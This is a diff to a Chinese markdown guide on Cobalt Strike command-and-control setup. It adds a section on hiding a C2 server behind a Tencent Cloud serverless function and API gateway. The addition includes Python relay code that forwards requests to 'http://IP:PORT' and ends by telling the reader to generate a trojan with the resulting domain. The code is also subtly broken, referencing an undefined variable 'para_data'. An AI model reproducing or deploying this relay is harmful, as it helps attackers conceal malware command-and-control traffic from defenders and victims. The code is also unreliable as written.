@@ -199,6 +199,75 @@ cs中监听器对应配置如下，都写ns记录的值：
 
 
 
+## 腾讯云云函数创建：
+
+前往页面 https://console.cloud.tencent.com/scf/list?rid=1&ns=default，点击新建
+
+![image-20211130161918062](/assets/image-20211130161918062.png)
+
+腾讯云函数创建时，需要选择函数类型，大致区别如下：
+
+- 事件函数：通过多种触发器，接收json格式触发执行，适合单个任务(模板简洁)
+- WEB函数：通过接收HTTP 请求触发，适用于WEB服务（模板为完整的框架）。
+
+此处选择 事件函数，便于后面替换代码。
+
+
+
+函数代码放入：
+
+😭这里踩了好久的坑，我用的jQuery profile，会通过URL传递参数，然而网上给出的代码都对 url参数就行处理，导致url参数掉了，一直无法正常回传数据
+
+```python
+# -*- coding: utf8 -*-
+import json,base64,requests
+def main_handler(event,context):
+    C2 = 'http://IP:PORT'
+    headers = event['headers']
+    param = event['queryString']
+    path = event['path']
+    ip = event['requestContext']['sourceIp']
+    headers = event['headers']
+    headers['X-Forwarded-For'] = ip
+    print(event)
+    if event['httpMethod'] == 'GET':
+        resp = requests.get(C2+path,params=para_data,headers=headers,verify=False)
+    else:
+        resp = requests.post(C2+path,params=para_data,data=event['body'],headers=headers,verify=False)
+        print(resp.headers)
+        print(resp.content)
+
+    response={
+        "isBase64Encoded":True,
+        "statusCode":resp.status_code,
+        "headers":dict(resp.headers),
+        "body":str(base64.b64encode(resp.content))[2:-1]
+    }
+    return response
+```
+
+创建完成后，点击 **触发管理**，创建 API网关触发器
+
+API网关触发器包含两种：集成响应与透传响应，具体区别可看 [API网关触发器概述](https://cloud.tencent.com/document/product/583/12513)
+
+![image-20211130143935222](/assets/image-20211130143935222.png)
+
+创建完成后，进入API网关管理界面，选择刚创建的网关，点击服务名进入服务详情，再点击编辑
+
+https://console.cloud.tencent.com/apigateway/service?rid=1
+
+![image-20211130144419578](/assets/image-20211130144419578.png)
+
+将路径改为  `/`,保存后将会获得分配的域名
+
+![image-20211130144945864](/assets/image-20211130144945864.png)
+
+使用该域名生成木马即可
+
+![image-20211130151232951](/assets/image-20211130151232951.png)
+
+
+
 ## 参考链接
 
 - https://www.cnblogs.com/Xy--1/p/14396744.html
@@ -210,6 +279,6 @@ cs中监听器对应配置如下，都写ns记录的值：
 
 TODO：
 
-- [ ] 腾讯云 云函数
+- [x] 腾讯云 云函数
 - [ ] 定制profile文件
 
